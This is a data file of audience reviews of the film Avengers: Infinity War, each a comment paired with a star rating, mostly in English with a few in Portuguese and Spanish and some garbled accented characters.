"10 years. 10 long years of amazing movies, unforgettable characters and endearing storylines. 10 years of speculation of how it would all end, how it would all play out and if it could possibly live up to expectations. After 10 years of waiting, we get to wait a little longer. Infinity War is amazing. A visual spectacle that takes everything we have loved from Marvel and magnifies it 1000x. Though a long movie, it packs way more action, storytelling and emotion in its 3 hours then you would believe it could. Thanos is a compelling villain, one that has a plan that in theory makes sense. As we see even when he is implementing his plan, we see the torment it places upon him because he has to lose so much in order to fulfill his plan. The main reason that Thanos may be the greatest movie villain of all time is simply because he succeeds in his goals. Everything he seeks out to do, despite blockages and tough decisions. he accomplishes. With 4 movies left after this film in the canon of this arc (Ant-Man and the Wasp, Captain Marvel, Endgame and Far From Home), there is still so much more story left to get to. The journey continues and it is gonna be biblical.",5
The nerds went crazy with this movie. Me too. Definetely one of the best superhero movies,5
An incredibly ambitious conclusion (Part 1) to the last decade of Marvel films that mostly pulls it off. The only thing dampening the shocking ending is knowing that it is all only until the heroes save the day in the next installment.,3.5
"This film is so amazing! I love this film. It had a great story, great cast and the visuals in this film were really well done. This film even has a cliffhanger at the end where you wonder what is going to happen in the next film. This is truly one of my favorite Marvel films of all time and one of my favorite films of 2018.",5
Brilliant depiction of the motives behind thanos and why he wants to do what he does. Amazing movie.,5
I swear the theater was spinning through space during this movie.,4
Absolutely Amazing!!!!,5
Probably the most entertaining movie I've ever seen. Thanos beats Heath Ledger's Joker out for best comic movie villian of all time.,5
Marvel delivers an amazing movie once again. Except this time all my faves died and they made me watch spidey die. Thanks a lot Marvel. 5 TIMES I'VE WATCHED THIS MOVIE AND I CRY EVERY SINGLE TIME.,5
"Easily the best Avengers movie, and the best movie in the entire MCU. Thanos is a better villain than all of the Marvel bad guys combined because you actually fear him. The stakes are high here, and every encounter with the Mad Titan feels like it could end with fatal results for our heroes. Somehow the Marvel movie with 10,000 different characters manages to have some of the absolute best character building. And when the big spectacle moments happen, they land better than you thought possible.",5
"AVENGERS INFINITY WAR sees Thanos (exquisitely performed by a regal Josh Brolin) finally being fully fleshed out as a character. In a way, he is the main focus of the film, and even managed to both make me tear up, and even made a certain amount of sense in his motivations. Like all great villains, he doesn't see himself as one, but instead as a saviour. He just has this conviction that living beings are overabundant and are slowly destroying the World, and that true peace can only be achieved by the elimination of at least half of them. I have to admit that there are days where I feel pretty much like he does. Most of the superheroes that populates the MCU appear in INFINITY WAR, with the notable exception of HAWKEYE and ANT-MAN (who I believe may end up in the sequel, because there WILL BE a sequel, judging from the decisively open-handed, shocking ending. ) and Tessa Thompson's Valkyrie, as well as the majority of the Asgardians who were aboard the spaceship at the end of THOR:RAGNAROK, are suspiciously absent. Have they fled before the attack by Thanos' brood that opens the film? Will their whereabouts be revealed in the sequel? Stay tuned. This deluge of characters could feel overwhelming, but directors Anthony and Joseph Russo, who had demonstrated their uncanny ability to handle an enormous super-powered ensemble cast and outstanding action set pieces in their previous MCU entry, CAPTAIN AMERICA: CIVIL WAR, are in top form, accumulating show-stopping moments in a veritable orgy of mostly stunning special effects (Some of the CGI characters left me cold, but nothing to really take me out of the film.). There is little room for character development, although it can be argued that this feels very much like a season cliffhanger on TV. The character work had been done in the preceding season, so to speak, the same way we have seen those heroes evolve through 18 movies so far. By this point, we know them and their interactions clearly, leaving room for the villain of the piece to take centre stage. This is not to say we don't get the now essential quips and character quirks, making new alliances entertaining and fun (Thor's team-up with The Guardians of the Galaxy is rife with humorous moments, for instance, making good use of Chris Hemsworth's talent for deadpan and Chris Pratt's natural braggadocio.), adding welcome moments of levity in an overall pretty grim premise. Fans like me will rejoice in seeing Thor reacquire somewhat more traditional regalia, bringing him closer to his classic look than the one he sported in RAGNAROK. And isolated moments like the simply superb first appearance of Captain America (now having abandoned his star-spangled costume for a darker outfit, reflecting the disillusion he experienced after the end of CIVIL WAR), or his exhilarating race towards certain doom side by side with the Black Panther on the plains of Wakanda, are pieces of geek perfection. Is this the best Marvel movie? I wouldn't venture to go there. But there is no denying it is the most ambitious. Writer Warren Ellis has an interesting way to see it; ''It is not a movie. It is a brand manifestation that wants to have prolonged, eager and reasonably skilled cultural sex with you. It wants your experience with its content‚Ñ¢ to be satisfying and it hopes you are pleased enough to return for further interaction with the Brand. This is a very 21C thing. I like it for that alone, to be honest.'' He may have a point. In a sense, this isn't quite a movie. Not in the way we are used to experience them. Most films would try to at least be somewhat palatable or easy to digest for the uninitiated. This sensory overload of a motion picture caters strictly to the fans. A bright, loud shiny reward for the viewers who sat through the 18 previous films of the MCU, and who will keep sitting patiently through myriads of credit scenes for a glimpse at the promise of super-powered silver screen antics in the near future. It exists as a gigantic cinematic anomaly, both wildly popular yet undeniably hermetic. One can hope that Hollywood doesn't attempt to learn the wrong lesson from its success, as it often does. Its success is not explained by the ridiculous amount of characters, or by its relentless succession of action sequences that ties together a somewhat fragile plot. It is not in the colorful cavalcade of CGI wizardry that fills the Imax sized screen to capacity. INFINITY WAR triumphs by expertly exploiting love for characters we have seen evolve on the silver screen over the span of the last 10 years, and for whom a vast majority of the viewers have shared a vested passion since Jack Kirby and Stan Lee decided to revive superheroes all the way back in 1961. It thrives on this affection that has spanned thousands of story lines, tons of ink, incalculable amount of coffee, and nearly 60 years of super-powered escapism. It lives and prospers because it elevates its source material, both making it current while respecting its humble pop culture roots. To paraphrase Gowan, Marvel movies are a strange animal I've got to follow.",4.5
"Long behold, the film everyone has been waiting ten years for, is finally here! This is one of those Marvel films that anyone can enjoy, while the Russo Brothers also brilliantly utilizes all that we've learned in the past MCU films, to create the most cohesive, emotional, and high octane, story yet! The Russo Brothers utilized some of the best tones the MCU has set, to really enhance the emotion and tention in every scene. They put a great deal of heart into this film, but sometimes it got cut thin by the over abundance of jokes, that Marvel seems to think is necessary, every opportunity there is. The Russo Brothers had both hands on the wheel at all times, setting this fast, yet brisk pace, incorporating countless memorable scenes! There wasn't a scene that goes under appreciated, adding in tremendous risk, from the most menacing villain yet, but at times, it can feel a little clunky with the scene placement. With this still being a story-based film, the characters moved the story really well, being the driving force of the film! While having all of these characters on screen at once, it's impossible to balance everyone equally, but the Russo Brothers were able to create so many amazing character moments, to get you really invested into what's going on, and not so much, what they missed. Even though they can step on their own toes at times, creating some inconsistencies and plot gaps, they still did a good job of understanding where these characters come from, and used them to their strengths. The cast as a whole does a great job, displaying seamless chemistry, even from some of the side and new characters. The screenplay by Christopher Markus & Stephen McFeely, was very good overall. There are a lot more high points to the writing than bad, but there are still some forceful pieces of dialogue and jokes at times. Markus and McFeely have had their hands in most of these films, creating some hit or miss screenplays, but they put on their best work here. So far, Infinity War undoubtedly has the best action sequences of the saga. The Russo Brothers crafted so many high octane action scenes, backed up by some amazing stunt work. The effects were done pretty well for the most part, but there are some points where you can tell they got lazy, and didn't completely polish things up as well as they could've. Overall, Infinity War is THE BEST film of the Infinity Saga, bringing these films to new heights!",4
WTF!!!!!!!!!!!!!!!!! THRILLING AND EPIC This movie needs more than 85% Of certified,5
Great scenes. Great battles. Great villain. Great characters. Great movie,5
The best Marvel film!,5
"Hands down the best movie in the MCU. Joe and Anthony Russo accomplish a task that should be impossible. After Avengers 1, it seemed like Joss Whedon was the only one who could pull such a big team up film off. But Avengers: Infinity War takes it to the next level and incorporates 24 different heroes introduced in their own movies or franchises and manages to balance all the characters perfectly, so none of them feel unnecessary. It never feels overloaded, and every character has something to do. This was the movie that had been built up in the MCU for 10 years, and it certainly did not disappoint. Thanos is not just the best MCU villain, but one of the best comic book villains ever. This movie made the right decision by making Thanos the protagonist, not the antagonist. This is about Thanos and his mission to bring balance to all of life by eliminating half of it. While many may argue about overpopulation motivation being untrue in real life, it doesn't matter, as this movie is not trying to be a movie like Black Panther or the Winter Soldier. Thanos has a compelling motivation and we see exactly why he does what he does even though we don't agree with him. And he is menacing enough to pose a great threat to our heroes, as he defeated them more than anyone ever had before. Thanos winning at the end is one of the biggest surprises I've had. Seeing half of our beloved heroes that we've known for a while fade into dust is so shocking, and we feel the pain of the survivors, especially when Tony sees Peter Parker fade to dust in his arms. This movie redeemed made Gamora and interesting character and expanded Thor's amazing arc from Ragnarok. It also has amazing entrances from Captain America and Thor. This movie is a masterpiece and it is definitely one of my favorite movies of all time.",5
"Avengers Infinity War, the first part of what is possibly(and probably) the biggest event in cinema history! All of these characters, ranging from the Guardians of the Galaxy in their wacky space! Or Black Panther in his serious Wakanda, they all come together to face their biggest threat, Thanos. Thanos is the most interesting villain in the MCU. Why? Because the movie follows him as if he was the protagonist! And that's what Thanos sees himself as! Join him as we follow Thanos experience the Hero's Journey, as no matter how far you're through the movie, something exciting will happen at every minute! Avengers Infinity War decides to take no breaks as it wants to do the best it can to end the Infinity Saga! So overall, no matter who you are, watch this movie! Watching it in theaters is the best way to experience it! But even if you watch it at home, prepare yourself by watching all the other MCU movies to understand it!",4.5
Brilliant movie can't wait for next one,4.5
"This is just slightly worse than Avengers: Endgame. There isn't anything wrong with it. It has emotion, action, comedy and entertainment. This was really hard to pull of. The Guardians of the Galaxy perfectly interact with Thor. The fight in Wakanda works perfectly too. Iron Man, Doctor Strange and Spider-Man have incredible chemistry and funny lines. Thanos is the best villain ever put on the big screen. They really show you how he would do anything for his plan. He really wants to help. Even though we don't agree with him. What makes him so good, is how calm he is while killing half of the universe.",5
"It's fine. However I miss Joss, he found a way to give everyone time to shine. This film has far too many characters many seem to be there just for the IMDB credit, Thanos is one of the best characters but there is not much story besides his.",3
"10 years it took to get all the characters together and I loved it. Seeing all the characters and their personalities collide and the banter that comes with it was very funny and enjoyable. Seeing Peter Quill interact with Thor, seeing Doctor Strange interact with Iron Man etc etc was so interesting and I'm so glad I get to watch this movie. Josh Brolin as Thanos did a great job. Thor has one of my favorite scenes I've ever seen in a movie. I enjoyed the action and just enjoyed all of it. The ending was crazy and seeing people disappear was crazy. Just an amazing movie",4.5
"""The most anticipated film of that year"" ""The great premiere of an action-packed film"". Avengers Infinity War, a film produced by the Russo brothers, brought by the most popular company in comics, Marvel. To end an era of 10 years of movies which would end with a saga, ""The saga of Infinity"". This movie sends us into an explosion of emotions, full of cosmic suspense, where we will see our heroes fight against the great villain, Thanos. The film will explore pain and suffering for our heroes, something that will leave us totally disoriented, surprised and extremely sad. In giving my opinion on this film, suffice it to say that it is the largest superhero film to ever make it to the cinema, it is emotional, heartbreaking and above all explosive, with a good story within the film genre.",4.5
best marvel movie to me,5
"This movie is absolutely CRAZY INSANE!! On scale, it is enormous, and it is action-packed with great fun, action, and emotion! It is a very successful culmination of 10 years of Story Telling at Marvel and proves how great Marvel is at telling stories! It's SO GOOD!",5
My favourite of the avengers films...Thanos is a brilliant and worthy foe...Everyone else on top form big budget fight scenes and gripping from start to finish...A true blockbuster heavyweight,4.5
My favorite film of all time.,5
"The scope of the movie is its downfall. No death feels certain or even impacting and the development brought in the films on indvidual characters is lost is mishmash of effects and causes. Lifeless, boring, and uninteresting",1
"A brilliant movie to see, just better if you have seen the movies beforehand as you are not given a moment to stop. This works in the movies favour greatly and is a must see for everyone.",4.5
"One of the best MCU movies by far. Action, emotion, and a phenomenal cross-over.",4.5
everything you would ever want from a comic book marvel film. what can i say? this is a comic book film at its finest.,5
"While the fight sequences are outstanding and the intensity is amplified, Infinity War struggles to maintain a steady plot due to the addition of EVEN MORE heroes. It was a good setup to the finale, but it was hard to really develop a central series of characters when they were all scattered on different sides of the galaxy",3.5
Best Avengers movie!,5
Some fantastic action sequences and impressive juggling of characters outweigh the few issues the film has,3.5
"This movie is a kid emptying his toy box on the floor Once you get past how cool it is to see all these characters on screen together, this movie is very lacking. The characters have no consistency, the deaths are hollow and are just there for shock value since we all know they won't say dead, the power levels of the characters and the stones fluctuate to fit what the plot needs. This is a very flawed film, but with that said I still think it's the best marvel film by far. The action and Thor's subplot are both good and Thanos is great, his character holds the movie together.",4
This could be one of the best in the MCU. For sure in the top five in the MCU. The first time we really get to see Thanos in action. I love that this film has our heroes split apart and the odds against them. The movie starts out with some good action and never lets down. You won't even notice this movie is nearly three hours long. In 20-40 years people will still be talking about this one.,4.5
Amazing film with fantastic music and cinematography .action packed,5
"Long movie, but interesting watching all the parts come together and how the plot tied a lot of the movies together too. The humor was good and I enjoyed a lot of the character interaction. Graphics were cool and fight scenes well done. Ending was a surprise, that left a cliffhanger for the final.",4
One of my favorites MCU movies.,5
I've respect for kids and for those who never grow up and love comics. Marvel is for them. I'll stay with Woody Allen.,3
a sad and amazing marvel movie. it made feel a lot of feelings in the theater like endgame.,5
Honestly had no idea how they would bring so many superheros into one movie but they pulled it off in every way!,5
first MCU movie I saw and I just had to watch the rest! - JwillUHC (2dk),5
"Thanos, just why. Overall good movie",4
Me arrisco a dizer que esse √© o √∫nico filme que bate de frente com Endgame.,5
One of the greatest movie you will see.,5
"Very good movie, like lord of the rings, star wars, that level.",4
An exceptionally good action movie with all the bells and whistles.,5
This should have been endgame part 1 as the movie does not end properly. Writing let this down. Charictors are not consistant and story stutters along.,2
"Too childish. There is a lack of blood, sadness and surprise. There were a lot of trailers, which hurt a lot",2
"This movie is emotional, action-packed, and different from everything else we've gotten up to this point. Seeing different universes collide is fantastic, and any movie with Spider-Man and the Guardians gets a thumbs up from me. This movie rocks.",4.5
"The moment the movie begins it grips you from Loki's ""death"" to the moment the snap takes place and sets up Engame this truly is Josh Brolin's Thanos that gives the story even more weight then it already has",4.5
An ambitious franchise slowly hitting its peak; imperatively puts this chapter in a harrowing and unprecedented Marvel story which not only leaves a scar to Marvel fans but also emphasizes bigger urgency of expectation to the next chapter.,4
"Infinity war satisfyes every fan's expectations, with plenty of fanservice, exciting action and visuals, cool humor, emotive moments, and character development. Although the plot is advanced by poor character decisions, it ultimately becomes the best movie of the mcu, ending in one of the best cliffhangers of all time.",5

A edi√ß√£o do filme √© espetacular. Chega um momento onde tudo est√° acontecendo simultaneamente, e nada parece ser desperdi√ßado: na realidade, √© t√£o bem montado que o filme parece durar uma hora. A obra √© genuinamente engra√ßada, e sabe separar isso da atmosfera de uma maneira muito eficiente, j√° que a quebra vem em momentos inteligentes e aceit√°veis. As cenas do Bruce falando com o Hulk s√£o demasiadamente exageradas, mas nada que estrague a experiencia. Por outro lado, algumas s√£o t√£o memor√°veis que, al√©m de virar memes, te fazem dar risada mesmo vendo pela quinta vez. A fotografia √© bel√≠ssima. A OST segue o padr√£o de qualidade, mas com um claro destaque na que se refere ao vil√£o, que casa muito bem com seu perfil. Algo que n√£o posso deixar de mencionar √© o tempo de tela bem administrado, dando a sensa√ß√£o de que n√£o fala ningu√©m - o que √© um trabalho muito dif√≠cil num projeto com tal magnitude.",5
the Empire strikes Back of the MCU!,5
"IW is engaging from start to end. The surprise here is the protagonist is Thanos. As such, the superheroes end up undermined and some of them disappoint. But still, it's worth a watch and hopefully worth waiting a year for the endgame.",3
"The best MCU movie! It nails the action, it nails the villain, it nails the comedy, it nails the emotional depth, the acting is superb, the visuals are superb and 90% of the characters were handled really well. I don't know how the Russos managed this ambitious task but I'm so thankful they did.",5
"What a film! this is one of, if not the best film in the MCU. The way they put the characters in different groups was suprisingly good, the guardians and Thor might have been one of my favorite team ups in the history of the MCU. This movie had emotion, good dialogue, and amazing action. This movie proves that The Russo Brothers are the best at what they do, another win for marvel",5
"Yes it was a great movie, the acting and casting was really good and the story was spectacular and at the end of the movie it left us on a cliffhanger as we wanted more of it. I'd give it 95%",4.5
I love this movie. I love all the characters how well developed they are the fight sequences are amazing. Thanos is such an amazing villain in this film. I prefer this movie over Endgame.,5
"As a person who dies for consistency, Infinity War... didn't meet this standard. There were things that annoyed me such as the power stone blowing up an entire planet in Guardians of the Galaxy yet Thanos being incapable of doing this with four stones. Even if the power stone would've destroyed the time stone, Thanos could've just used the space stone to paralyse Dr. Strange and protect him from the blast and then force him to give up the stone. There were so many plot holes in this film; it could've been better. There were eye-pleasing action scenes, yet most of these were illogical to say the least and again full of plot holes such as the extreme variations in the power of Scarlet Witch, and given the number of superheroes with their various powers there was so much that could've been done but wasn't due to plot armour, and it's clear this was made for the cinema and not real life. Nevertheless, I don't care. I tried to love this movie at first but I then realised I was overestimating how awesome it was because I had been excited about it for five years since Age of Ultron, and I desperately wanted it to live up to my expectations. Thor was cool but he was an absolute plot device to subvert expectations and it did not fit with the previous rules that Ragnarok lay out for his powers, which was the far more interesting storyline. I tried to love this movie but something just didn't fit. I spent some time thinking about which parts didn't fit, and then I realised the only inconsistency in the MCU was this film. It is better than Dark World and Age of Ultron, but I don't enjoy movies unless they make sense given the premise and the laws the movies lay out for it, and that was what annoyed me. Despite having a few comedic relief scenes, the jokes aren't nearly as funny as I remembered. There were a few other things that bugged me, such as Robert Downy Jr's CGI suit looking very much like it was made of plastic in the New York scene. Gamora's death was sad, but almost every other death in this movie was severely inconsequential due to the obviousness of the storyline. This movie's plotline would've been amongst the most intriguing in a time when the Internet didn't exist and you could view which actors would be playing whom in the movie. Alas, now you can, and the effect is ruined because you know the characters will come back in the next movie like nothing happened. Don't use Ragnarok as a switchover storyline so you can give Thor a new axe- that should've waited a few movies - and certainly don't imply that such an axe can kill a being with all six Infinity Stones while its ancestor was crushed in the fist of a being less powerful. Thanos has all six Finity Stones, which can do absolutely anything your heart desires when you use them all together (which makes me wonder why one needs to snap their fingers at all) yet can't manipulate the laws of nature so he can fly and make himself worthy? I don't have the answer to this, but the inconsistencies and contradictions were so numerous it made it hard for my logic-seeking brain to enjoy this movie as much as I would've liked. The stones shouldn't have been aquired until much later in the movie, and during that time I would've liked it to be clearly shown what each stone does. We never got to see such a thorough thing from the time and soul stone. It seems that used on their own the stones do no more than give you strong superpowers, so unless you can give some consistent basis for how they work, such as using up the holder's energy, which it doesn't do considering how the stones were used as plot easy-win devices in previous movies, it kind of undermines the name ""Infinity"", doesn't it? 3 stars.",3
Worthy continuation of the series,4
Best Avengers movie imo. Really exciting and fun.,5
"Avengers Infinity war brings us to the climax of Marvel's Infinity Saga Project. This brings all of the heroes and their stories to go against Thanos. Amazing performances and visual effects. Super intense and brings us the true excitement we have been waiting for, for over a decade!",5
"Best superhero movie I've ever seen. The writers and editors had a challenge here finding something for all those characters to do, but they managed it beautifully. This one kept me on the edge of my seat from beginning to end.",5
This is example how to make great movie!,5
"Amazing movie, it's a bit rushed but that's okay. The movie is epic and emotional, it's really something.",5
"Para alguien que ha visto todas las pel√≠culas del MCU y leido c√≥mics desde hacer m√°s de 20 a√±os, la pel√≠cula ha estado a la altura de las expectativas.",5
"Avengers: Infinity War really knows how to put every superhero into one. I really enjoyed this movie because of the following: The Russo Brother's direction, good sense of humor, intense action sequences, unique screenplay, and the grand finale. Can I say more? Overall, Avengers: Infinity War really put the hype into the MCU as always. And I can't argue with that. Period.",5
Just awesome. A cultural event.,4.5
"I absolutely love this movie it is one of my favorites. And this is one of the funniest movies in the MCU and in my opinion surprising because it doesn't really seem like a funny movie. There is one scene that shows Thor's humanity and it is sad because he tells every traumatic thing that has happened to him since Thor. There is another scene that shows Dr. Strange knowing the future and it is pretty sad because he knows everything that happens in Endgame. One thing that Marvel always gets right is the CGI they do such a good job at the Suits and the background in some planets looks so lifelike and Thanos the skin and the wrinkles on his forehead look so lifelike I'm surprised they made it look like that. Like I said in the previous reviews the acting is pretty solid in the MCU and I think they do a pretty good job in this movie and it has some of the best acting in the MCU, also the voice work for Rocket Raccoon is very good. Like I've said in the previous reviews to the score in each movie and especially this one is very good and the score really elevates so many scenes in this movie it just makes it so much better than it already is. The sound design in the blast and the infinity stones and all of the sound effects sound amazing in each movie and none of the movies really disappoint in the technical category. When Thanos snaps it is so sad because we lose beloved characters and it kinda a twist on the normal narrative in them winning in this movie they don't win and it is a very big twist. They do a good job of transferring tones for Thor in the MCU from funny to serious because of his loss and some people don't like the version of Thor in Endgame but I think it makes sense because of loss and guilt. This movie has some of the best action scenes in the whole MCU and they look so cool. The ending is very sad again because they just keep losing against this mad titan and they never win. Overall I absolutely loved this movie would recommend it to anyone. üíØ%",5
"Great movie, the ending was awesome as well..",4.5
One of the greatest comic book movies of all time. Superb action all around. Top 5.,5
this film is very bom,5
It's nice seeing a superhero movie where the heroes don't win in the end. Was expecting to be bored but enjoyed it throughout. Long drawn out action that stays fresh throughout. 4/5.,4
"Finally watched this film as well. I was sad at the end seeing some of the Avengers, or Marvel characters, disappear in ashes. Another sad part was seeing some dead. The beginning was intense! Shows how strong the villain was! Definitely worth watching! You will be MIND-BLOWN!",5
Marvel has its game down. 3/15/20 Fantastic movie Worthy rewatch,5
Fantastic action effects and interesting relationship between all sperheroes make Infinity War a successful one.,5
"People naturally seek entertainment that fill the need for adventure and excitement, explains why comic movies became so popular. They naturally fit the genre: heroes and villains, some with fantastic powers, told in a grandiose scale. They are like modern version of myths from the past: from Gilgamesh to the Greek Gods. In today's society with video games and technology in the mainstream, it's not just diehard fans consume this type of media. Few exemplify this phenomenon like Avengers: Infinity War. There were other comic book movies prior to this one, but none as successful. One of the creators were Stan Lee, who was famous for his comic book heroes such as Spider Man, which had its own movie franchise under Sony. In 2008, Marvel Studios released a film titled: Iron Man, starting Robert Downey Jr. It was the first film of over 23 films to start the Marvel Cinematic Universe. These movies introduced heroes and villains; some heroes had trilogies. Ultimately, all the story arcs came together to a conclusion, which ‚ÄòInfinity War' is part one of two. I have chosen to review the first film of the two-part conclusion, because it was the more interesting movie. There were prior Avengers movies that brought a handful of heroes to the same screen, but Infinity War had quite a challenge to meet. There were over a dozen heroes to splint screen time and present a coherent story, and finally we get to see Thanos as the main villain. The Russo brothers directed this movie with Producer Kevin Feige at the helm, and they wrote a coherent movie despite the tremendous number pieces to cobble together. The movie opens with the villain Thanos reveals himself, briefly there is brutal hand-to-hand action with the Hulk, showing Thanos' raw strength with the Hulk's easy defeat. Thor revealed tearful emotion with the death of his brother Loki at the hand of Thanos. Thor came a long away from his original debut in 2011. He was once arguably the most boring character, he was essentially one dimensional, he is depicted as proud and arrogant. Although there is some change in his character through humility and willingness to sacrifice in the first movie, the depiction was a bit ham-fisted. The second movie was even worse, where the character seems to just fight the bad guy and save another day. The third movie was an interesting one, Ragnarok, changed the tone to an action-comedy, which played to the over-the-top absurdity of the movies we are used to watching. In Infinity War, Thor is depicted as a King that lost its people, out for revenge. His loss is enormous, and this is compounded by his experiences in the previous movie with the loss of his father and home world. One of the best character development of the series. By contrast the Vision and the Scarlet Witch is far less developed. To be fair, they were minor characters with no movie of their own. In this movie, they are suddenly a couple, trying to carve their own, normal life. This wouldn't be an issue if they stayed as minor characters in the background beating up henchmen, but they play an important part at the end of this movie. Creators squandered an opportunity to make an emotionally impactful moment for the audience. They should have invested more with the characters or chose a different arc altogether for the climatic seen where Thanos turns back time to ultimately collect all six Infinity Stones. Music was produced by Alan Silverstri, who composed the score for The Avengers, and returned for the Infinity War. The cinematic score was appropriate to the epic scale, and it brought back the iconic ""Avengers' Theme."" What stood out of course is the visuals, no doubt a movie of this scale would have the budget to create top notch visuals, but certain details need to be pointed out. Transformation of actor Josh Brolin to Thanos is very subtle, it shows how far CGI effects come along since the early days. The character has wrinkles, faded scars, even pores on screen. Under certain lighting, it looks like flesh, perhaps made of rubber, but looks and almost feels like physical presence. The CGI also aides in the action, from Thanos pulling a piece of the moon and to the explosions and graphic vistas are beautiful. When are heroes and Thanos face-off on the fallen planet, the background is a space opera painting, in its dark orange hue. Finally, the movie was a success by the strength of the actor to bring the main character to life. I believe the main character is the villain, Thanos. Josh Brolin played a complex character, whom had a twisted logic to his universe destroying plans. Although he seemingly has no empathy to the billions he kills, but he does express guilt at times. Particularly when he must sacrifice his adopted daughter, Gamora. I was surprised by the scene; I didn't expect this kind of emotionality from this character. He also seems cold, calculating, logical. An example of complete control, which makes him a fierce opponent. But here we can see a person who is torn by the choice he must make, certainly he made the same decision to kill before, but this time it affects him personally. Is he shedding a tear for his daughter and himself or is he realizing the cost of this decisions he made before, and the suffering he caused others? Most of the movie follows a familiar arc, heroes find problem, seek to fix problem, finds a solution, and defeats the villain. Thor even forges a new weapon and gain new level of power, classic tale of hero and weapon clich√©. However, this movie turns the expectations on its head. Toward the very end, Thor buries his axe into the chest of Thanos, here we think that the villain is defeated. But with a snap of his fingers, Thanos wins. He escapes into the cloud and the heroes are left to watch as friends and loved ones fade away. The bad guy wins. These are examples why Avengers Infinity War is not just another comic book movie. The movie invokes questions like why he did this or that, you question the motives of the characters, rather than just watch them do it. This movie is an excellent example of what a comic book movie could be, and worth your time to watch.",5
"This was an awesome movie and everything Marvel fans had been dreaming of for 10 years. As someone who had been following the MCU since its infancy, I was overjoyed at how all the heroes meshed so well together to face their most formidable foe to date. I felt that the Russo brothers selected the best groups of heroes to team up and found the chemistry between these rag-tag groups was off the charts. RDJ and Benedict Cumberbatch's deft interplay was especially entertaining as they vied for title of best Sherlock in the MCU. Their performances were especially impressive given the sheer amount of visual effects used throughout the film. And the visual effects, by the way, were absolutely tremendous. From the magnificent Dr. Strange and Thanos duel on Titan to the gorgeously rendered and realistic details of Thanos' being, Infinity War truly outshone all other Marvel movies as the most breathtaking work of cinema produced for any superhero movie. Josh Brolin's performance was excellent and lent a lot of humanity and sympathy to a character many saw as a psychopathic monger before this film. The choice to have Thanos' plan be one of perceived necessity and inevitability, instead of the hatred and resentment of Endgame's Thanos, truly lent an emotional weight to the character and his motivations. The ending of the film was also spectacular (if not just for the memes it spawned) and 'the dusting' remains one of the most emotionally impactful endings in superhero film history. Even if all those characters returned, it represented a monumental defeat for the Avengers and a beautifully dark ending that I have re-watched time and time again. Overall, this is the best MCU film and one of the best superhero films ever made.",4.5
Best Avengers movie because it brought almost all the characters in the MCU together. There was also a great set up to it of 18 films.,4
This movie kept me surprised and amazed. Great special effects too!,5
Review coming soon. (Star rating based on Little Man of the Santa Franciscio Chronicle),4
So close to such a perfect movie. Everything they did right. The only problem with the movie is there are a lot of bad human decisions that could have prevented Endgame from happening. But other than that very good. 2nd best superhero film of all time.,5
An excellent culmination of a decade in the making that expertly gives us a dour ending and gives us hype for the next chapter of the MCU,4.5
Thanos finally came and with him was the ending that must of us expected but never saw before!,4.5
Masterfully made epic has good characters and the mcu‚Äôs best villain in thanos,5
"Ahhhh, this movie was...a trip. From the get-go I knew this was a movie I wasn't going to enjoy. Loki's death was disturbing, not character accurate and just dumb. But aside from my bitterness toward Loki's ""dEaTh"", Thanos is the worst MCU villain. He is boring, purple, and flat. Josh Brllin does a good job of portraying him, he does what he can, but there was never one single time where I was intimated or in awe of Thanos. That and also the fact that there were just too many characters! The plot jumped around so much that every emotional beat was given hardly any time to resonate. But the best part of the movie, and the reason it's #22 on my list and not #23, is the ending. The ending was spectacular, with the dusting of the Avengers. It was emotional, and a new take on a superhero movie. So, I don't know how to feel. It was...ok....I guess...but I'll never watch it again.",1.5
A masterpiece and I actually really felt where Thanos was coming from. Best Marvel Cinematic Villian so far.,5
Gamora and Thanos were the highlights of this film. The latter is certainly a sociopath for whom I have no sympathy. But I appreciated Gamora in this film. It's a masterpiece.,5
"At last, after the culmination of 18 MCU movies, the biggest movies crossover event of all time is here. And it certainly doesn't disappoint, Avengers: Infinity War is my favourite Marvel movie ever. Thanos, after being sprinkled in many movies previously, is finally here and it's his time. His motivations are understandable, yet his heinous actions just make the character so much more interesting than the average universe-destroying villain. The Avengers fight his armies, but one by one, they fail. This movie wasn't afraid to have the villain win in the end. Overall, Avengers: Infinity War is an incredible, exciting superhero movie.",4.5
Lets keep things simple this movie was worth the wait and it was AWSOME!!!,4.5
"A very great, yet (somewhat) long movie. There are a few inconsistencies within this movie either with the character or plot, but the action compensated for this. Also contained a very good soundtrack.",4
"One of the biggest films of all time is an absolute must-see! It is incredibly rewarding if you have watched all the MCU but is still clear if you haven't watched anything before hand. The action is incredible and the character interactions are brilliant. Thanos is the best MCU villain and the ending is shocking and brutal (still great though). However, Scarlet Witch feels incredibly downgraded and inconsistent with her powers throughout the film and Thor's story feels quite distant from the film (however epic it is). They also completely waste certain characters, like Captain America.",4.5
Was kind of long but hit the feels at the end. Also all the different fights with Thanos show just how powerful he really is. Wakanda Forever!!,5
"A thoroughly enjoyable, quality action piece with a nerve raw heart, a great mashup of genres, some hilarious moments, creative action, a fantastic arc for the mad Titan Thanos, and a brilliant concoction of bringing together all the disparate threads generated over however many filmmakers and agendas over however many years. It's certainly a film that requires previous knowledge and it's certainly the first of two films but on a second watch the film breathes and its juggling of tones and steady hand under the Russo's is very clear. It's an event film and is in a class amongst the best we have these days. I was overly critical the first time but this time I enjoyed it for exactly what it was and appreciated its flow and clarity and quality. It's clever and fun and certainly a benchmark.",4
"Amazing, great climax.Loved the movie but Endgame is a bit better.",4.5
This is my favourite MCU movie. The groundbreaking drama at the end of of this is what defines this movie. Thanos is one of the best villains in cinema history.,5
"Marvel at it's best, ten years in the making all leading to this film and it does not disappoint in any way.",5
Greatness! The movie is a treat to watch & the ending is heart breaking.,5
Definitely a excellent correlation to connect all that has been going on in the mcu over the past 10 years leading up to this point.,4
"I‚Äôm told it was amazing by Marvel expects. While enjoying it, sooooo many sub-plot nuances I didn‚Äôt really have much idea what was going on beyond the main plot.",4
"The best Avengers movie, and my personal favorite superhero film of all time.",5
"It's pretty impressive how MCU has set a big story arc slowly developing throughout like 20 movies (okay, half or so had nothing to do with Thanos, but still), and then concluded it with a gigantic popcultural event which was the premieres of Infinity War and Endgame. Neither passes as really good movies in my book, but for the scale, scope and sheer ambition, they are something special, no doubt.",3.5
Masterpiece but the ending wow So sad I love it,5
"sickening, predictable scenes",0.5
I would have been fine with this as the cinematic universe true ending.,4
"This movie was good but it ultimately was a let down. It was too chaotic and didn't have a full grasp of the story. Despite this, it's a fun one and the ending makes it a MUST SEE.",3
Another great film in the MCU,4.5
